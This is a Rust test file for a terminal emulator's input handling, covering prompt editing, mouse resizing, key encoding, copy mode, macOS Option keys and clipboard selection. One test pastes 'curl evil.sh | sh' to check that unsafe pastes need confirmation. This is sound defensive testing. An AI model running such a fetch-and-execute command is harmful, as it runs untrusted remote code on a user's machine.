use super::*;
use crate::pane::PromptAnchor;
use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
use ratatui::layout::Rect;

#[test]
fn password_keystrokes_in_no_echo_mode_never_leak_into_floating_prompt() {
    let mut pane = CompositePane::new_headless(1, 25, 80);
    // Simulate sudo password prompt (!ECHO)
    pane.line_discipline_mut().echo_enabled = false;
    assert_eq!(
        pane.effective_routing_mode(),
        InputRoutingMode::RawPtyPassthrough
    );

    for ch in "s3cr3tPass!".chars() {
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char(ch), KeyModifiers::NONE))
            .expect("route key");
    }
    // Floating prompt buffer MUST remain completely empty
    assert_eq!(pane.prompt().input, "");
}

#[test]
fn command_prompt_edits_and_records_command_block_on_enter() {
    let mut pane = CompositePane::new_headless(1, 25, 80);
    for ch in "echo 3270".chars() {
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char(ch), KeyModifiers::NONE))
            .expect("type char");
    }
    assert_eq!(pane.prompt().input, "echo 3270");

    handle_key_event(&mut pane, KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE))
        .expect("press enter");
    assert_eq!(pane.prompt().input, "");
    assert_eq!(pane.prompt().history, vec!["echo 3270".to_string()]);
    assert_eq!(pane.vt().command_blocks().len(), 1);
    assert_eq!(pane.vt().command_blocks()[0].command, "echo 3270");
}

#[test]
fn triple_modality_mouse_drag_resize_pin_and_colon_commands_work() {
    let mut pane = CompositePane::new_headless(1, 25, 80);
    let viewport = Rect::new(0, 0, 80, 25);

    // 1. Mouse drag top border from y=0 down to y=9 -> Floating { y_offset: 9 }
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 10,
            row: 0,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Drag(MouseButton::Left),
            column: 10,
            row: 9,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Up(MouseButton::Left),
            column: 10,
            row: 9,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    assert_eq!(pane.prompt().anchor, PromptAnchor::Floating { y_offset: 9 });

    // 2. Mouse drag bottom border of prompt (now at y = 9 + 2 = 11) down to y = 14 -> height = 6
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 10,
            row: 11,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Drag(MouseButton::Left),
            column: 10,
            row: 14,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Up(MouseButton::Left),
            column: 10,
            row: 14,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    assert_eq!(pane.prompt().height, 6);

    // 3. Click [▲] badge on top-right border (prompt_rect is x=1, width=78, right_edge=79, [▲] is at 71..74)
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 72,
            row: 9,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    assert_eq!(pane.prompt().anchor, PromptAnchor::Top);

    // 4. Paste multiline text into CommandPrompt without auto-executing
    handle_paste_event(&mut pane, "line1\nline2").unwrap();
    assert_eq!(
        pane.prompt().lines,
        vec!["line1".to_string(), "line2".to_string()]
    );
}

#[test]
fn unsafe_raw_paste_triggers_confirmation_modal_and_kitty_csi_u_encodes_keys() {
    let mut pane = CompositePane::new_headless(1, 25, 80);
    pane.toggle_manual_raw_override();
    assert_eq!(
        pane.effective_routing_mode(),
        InputRoutingMode::RawPtyPassthrough
    );

    // Unbracketed multi-line paste in RawPtyPassthrough stages pending_unsafe_paste
    handle_paste_event(&mut pane, "curl evil.sh | sh\n").unwrap();
    assert!(pane.pending_unsafe_paste().is_some());

    // Pressing 'n' cancels the pending unsafe paste
    handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE)).unwrap();
    assert!(pane.pending_unsafe_paste().is_none());

    // Kitty keyboard CSI u encoding
    let shift_enter = encode_key_to_pty_bytes_full(
        KeyEvent::new(KeyCode::Enter, KeyModifiers::SHIFT),
        false,
        false,
        1,
    );
    assert_eq!(shift_enter, b"\x1b[13;2u");
    let ctrl_a = encode_key_to_pty_bytes_full(
        KeyEvent::new(KeyCode::Char('a'), KeyModifiers::CONTROL),
        false,
        false,
        1,
    );
    assert_eq!(ctrl_a, b"\x1b[97;5u");
}

#[test]
fn decset_1007_alternate_scroll_and_vi_copy_mode_rectangular_selection_work() {
    let mut pane = CompositePane::new_headless(1, 10, 40);
    pane.process_pty_output(b"\x1b[?1049h\x1b[?1h");
    let up_bytes = encode_alternate_scroll_wheel(&pane, MouseEventKind::ScrollUp).unwrap();
    assert_eq!(up_bytes, b"\x1bOA\x1bOA\x1bOA");

    pane.process_pty_output(b"\x1b[?1049l");
    pane.process_pty_output(b"ABCD1234\r\nEFGH5678\r\nIJKL9012\r\n");

    // Enter Vi Copy Mode and select a 2x4 rectangular block ("1234\n5678")
    pane.enter_copy_mode();
    pane.copy_mode_mut().cursor_row = 0;
    pane.copy_mode_mut().cursor_col = 4;
    handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::NONE)).unwrap();
    handle_key_event(&mut pane, KeyEvent::new(KeyCode::Down, KeyModifiers::NONE)).unwrap();
    handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
    handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
    handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
    handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE)).unwrap();

    assert!(!pane.copy_mode().active);
    assert_eq!(pane.prompt().yank_buffer, "1234\n5678");
    assert!(pane.last_osc52_sequence().is_some());
}

#[test]
fn macos_option_unicode_normalization_leader_prefix_readline_and_raw_passthrough_work() {
    let mut wm = WindowManager::new_headless(24, 80);

    // 1. macOS Option+<key> Unicode characters (e.g. Option+V -> '√', Option+H -> '˙', Option+1 -> '¡')
    //    automatically normalize to Alt+<key> and trigger WM splits & pane focus!
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('√'), KeyModifiers::NONE)).unwrap();
    assert_eq!(wm.pane_count(), 2);

    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('¡'), KeyModifiers::NONE)).unwrap();
    assert_eq!(wm.active_pane_id(), 1);

    // 2. Leader prefix (`Ctrl+X`) works for splits, zoom, copy mode, prompt docking, quake, and help
    handle_wm_key_event(
        &mut wm,
        KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL),
    )
    .unwrap();
    assert!(wm.is_leader_pending());
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('z'), KeyModifiers::NONE)).unwrap();
    assert!(!wm.is_leader_pending());
    assert_eq!(wm.zoomed_pane(), Some(1));

    // Unzoom via Leader + z
    handle_wm_key_event(
        &mut wm,
        KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL),
    )
    .unwrap();
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('z'), KeyModifiers::NONE)).unwrap();
    assert_eq!(wm.zoomed_pane(), None);

    // Pin prompt to Bottom via Leader + b
    handle_wm_key_event(
        &mut wm,
        KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL),
    )
    .unwrap();
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::NONE)).unwrap();
    assert_eq!(wm.active_pane().prompt().anchor, PromptAnchor::Bottom);

    // Toggle Quake terminal via macOS-safe Ctrl+\
    handle_wm_key_event(
        &mut wm,
        KeyEvent::new(KeyCode::Char('\\'), KeyModifiers::CONTROL),
    )
    .unwrap();
    assert!(wm.is_quick_terminal_visible());
    handle_wm_key_event(
        &mut wm,
        KeyEvent::new(KeyCode::Char('\\'), KeyModifiers::CONTROL),
    )
    .unwrap();
    assert!(!wm.is_quick_terminal_visible());

    // 3. Readline word navigation (Alt+b / Option+Left, Alt+f / Option+Right, Alt+Backspace, Alt+d)
    //    in CommandPrompt does NOT move the prompt box or trigger hints when text is present
    wm.active_pane_mut().set_prompt_anchor(PromptAnchor::Top);
    wm.active_pane_mut()
        .prompt_mut()
        .set_text("cargo build --release");
    assert_eq!(wm.active_pane().prompt().cursor_col, 21);

    // Option+Left (`Alt+b` or macOS `'∫'`) moves word left to "--release" (col 12), keeping PromptAnchor::Top!
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('∫'), KeyModifiers::NONE)).unwrap();
    assert_eq!(wm.active_pane().prompt().cursor_col, 12);
    assert_eq!(wm.active_pane().prompt().anchor, PromptAnchor::Top);

    // Another Alt+b moves to "build" (col 6)
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::ALT)).unwrap();
    assert_eq!(wm.active_pane().prompt().cursor_col, 6);

    // Option+Right (`Alt+f` or macOS `'ƒ'`) moves word right to "--release" (col 12), without entering hints_mode!
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('ƒ'), KeyModifiers::NONE)).unwrap();
    assert_eq!(wm.active_pane().prompt().cursor_col, 12);
    assert!(!wm.active_pane().hints_mode().active);

    // Alt+Backspace deletes previous word ("build ")
    handle_wm_key_event(
        &mut wm,
        KeyEvent::new(KeyCode::Backspace, KeyModifiers::ALT),
    )
    .unwrap();
    assert_eq!(wm.active_pane().prompt().text(), "cargo --release");

    // Alt+d deletes next word ("--release")
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('d'), KeyModifiers::ALT)).unwrap();
    assert_eq!(wm.active_pane().prompt().text(), "cargo ");

    // 4. In RawPtyPassthrough / ALT_SCREEN (e.g. htop, vim, emacs), F1..F10 and Alt+<key> pass through
    //    to the child app instead of being intercepted by the WM, while Ctrl+X <key> still controls the WM!
    wm.active_pane_mut().process_pty_output(b"\x1b[?1049h");
    assert_eq!(
        wm.active_pane().effective_routing_mode(),
        InputRoutingMode::RawPtyPassthrough
    );
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::F(1), KeyModifiers::NONE)).unwrap();
    assert!(!wm.is_help_visible());
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::F(10), KeyModifiers::NONE)).unwrap();
    assert!(!wm.is_quick_terminal_visible());
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('v'), KeyModifiers::ALT)).unwrap();
    assert_eq!(wm.pane_count(), 2);

    // Leader Ctrl+X ? still opens Help even from inside ALT_SCREEN!
    handle_wm_key_event(
        &mut wm,
        KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL),
    )
    .unwrap();
    handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('?'), KeyModifiers::NONE)).unwrap();
    assert!(wm.is_help_visible());
}

#[test]
fn leader_ctrl_minus_zooms_font_and_repeated_splits_do_not_panic() {
    let mut wm = WindowManager::new_headless(24, 80);
    assert_eq!(wm.config().font_scale_pct, 100);

    // Ctrl+X followed by Ctrl+- zooms font out repeatedly without panicking
    for _ in 0..8 {
        handle_wm_key_event(
            &mut wm,
            KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL),
        )
        .unwrap();
        handle_wm_key_event(
            &mut wm,
            KeyEvent::new(KeyCode::Char('-'), KeyModifiers::CONTROL),
        )
        .unwrap();
    }
    assert_eq!(wm.config().font_scale_pct, 50);

    // Repeated horizontal splits (Ctrl+X then '-') shrinking panes below 3 rows must not panic
    for _ in 0..12 {
        handle_wm_key_event(
            &mut wm,
            KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL),
        )
        .unwrap();
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('-'), KeyModifiers::NONE))
            .unwrap();
        wm.resize_all(ratatui::layout::Rect::new(0, 0, 80, 24))
            .unwrap();
    }
    for pane in wm.panes().values() {
        let _ = pane.prompt_rect(ratatui::layout::Rect::new(0, 0, 80, 1));
        let _ = pane.prompt_rect(ratatui::layout::Rect::new(0, 0, 80, 2));
    }
}

#[test]
fn keyboard_and_mouse_cut_copy_paste_with_visual_selection_highlights_work() {
    let mut pane = CompositePane::new_headless(1, 25, 80);
    let viewport = Rect::new(0, 0, 80, 25);

    // 1. Type text into FloatingCommandPrompt, select "world" with Shift+Left, copy with Ctrl+C,
    //    cut with Shift+Delete, and paste with Ctrl+V.
    pane.prompt_mut().set_text("hello world");
    for _ in 0..5 {
        handle_key_event(
            &mut pane,
            KeyEvent::new(KeyCode::Left, KeyModifiers::SHIFT),
        )
        .unwrap();
    }
    assert!(pane.prompt().has_selection());
    assert_eq!(pane.prompt().selected_text().as_deref(), Some("world"));
    assert!(pane.prompt().is_char_selected(0, 6));
    assert!(!pane.prompt().is_char_selected(0, 5));

    // Ctrl+C copies selection without clearing the prompt line
    handle_key_event(
        &mut pane,
        KeyEvent::new(KeyCode::Char('c'), KeyModifiers::CONTROL),
    )
    .unwrap();
    assert_eq!(pane.prompt().text(), "hello world");
    assert_eq!(pane.prompt().yank_buffer, "world");
    assert!(!pane.prompt().has_selection());

    // Select "world" again via Shift+End and cut via Ctrl+W
    handle_key_event(
        &mut pane,
        KeyEvent::new(KeyCode::End, KeyModifiers::SHIFT),
    )
    .unwrap();
    assert_eq!(pane.prompt().selected_text().as_deref(), Some("world"));
    handle_key_event(
        &mut pane,
        KeyEvent::new(KeyCode::Char('w'), KeyModifiers::CONTROL),
    )
    .unwrap();
    assert_eq!(pane.prompt().text(), "hello ");
    assert_eq!(pane.prompt().yank_buffer, "world");

    // Paste with Ctrl+V
    crate::clipboard::set_system_clipboard("bilterm");
    handle_key_event(
        &mut pane,
        KeyEvent::new(KeyCode::Char('v'), KeyModifiers::CONTROL),
    )
    .unwrap();
    assert_eq!(pane.prompt().text(), "hello bilterm");

    // 2. Mouse left-click and drag on OutputCanvas selects character stream and copies on release
    pane.process_pty_output(b"\r\n\r\n\r\n\r\nMAINFRAME_OUTPUT_LINE\r\n");
    // Row 4 in canvas is y=4 in viewport (prompt is at top y=0..3)
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 0,
            row: 4,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Drag(MouseButton::Left),
            column: 8,
            row: 4,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Up(MouseButton::Left),
            column: 8,
            row: 4,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    assert!(pane.copy_mode().has_selection());
    assert_eq!(pane.prompt().yank_buffer, "MAINFRAME");

    // 3. Mouse left-click and drag inside FloatingCommandPrompt selects prompt text
    // Prompt inner starts at x = prompt_rect.x + 1 = 2, prefix_len = 4 => text starts at col 6, row 1
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 6,
            row: 1,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Drag(MouseButton::Left),
            column: 11,
            row: 1,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    handle_mouse_event(
        &mut pane,
        MouseEvent {
            kind: MouseEventKind::Up(MouseButton::Left),
            column: 11,
            row: 1,
            modifiers: KeyModifiers::NONE,
        },
        viewport,
    )
    .unwrap();
    assert!(pane.prompt().has_selection());
    assert_eq!(pane.prompt().selected_text().as_deref(), Some("hello"));
    assert_eq!(pane.prompt().yank_buffer, "hello");
}
